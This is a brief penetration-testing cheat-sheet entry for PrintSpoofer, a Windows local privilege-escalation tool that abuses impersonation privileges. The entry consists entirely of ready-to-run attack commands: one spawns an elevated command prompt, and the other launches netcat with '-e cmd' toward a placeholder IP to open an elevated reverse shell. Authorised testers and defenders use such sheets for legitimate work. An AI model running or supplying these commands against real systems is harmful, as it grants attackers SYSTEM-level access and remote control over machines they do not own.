# printspoofer

% SeAssignPrimaryToken, SeImpersonate, token
#plateform/windows #target/local #cat/PRIVESC/TOKEN

## local priv
```cmd
.\PrintSpoofer.exe -i -c cmd
```


## elevated reverse shell
```cmd
.\PrintSpoofer.exe -c "<nc_path> <ip> port -e cmd"
```


